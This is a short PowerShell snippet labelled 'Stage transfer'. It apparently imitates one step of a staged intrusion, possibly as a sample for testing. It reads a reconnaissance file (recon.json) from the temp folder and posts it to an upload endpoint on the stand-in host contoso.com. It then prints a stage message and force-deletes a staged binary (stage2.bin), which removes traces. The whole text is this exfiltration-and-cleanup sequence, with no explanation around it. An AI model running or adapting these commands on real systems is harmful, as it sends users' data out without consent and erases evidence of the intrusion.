
<# Stage transfer #> $BodyText = Get-Content -Path "$env:TEMP\recon.json" -Raw; Invoke-RestMethod -Uri 'https://contoso.com:443/upload' -Method Post -Body $BodyText -ContentType "application/json"; Write-Output "stage 34 initialized"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
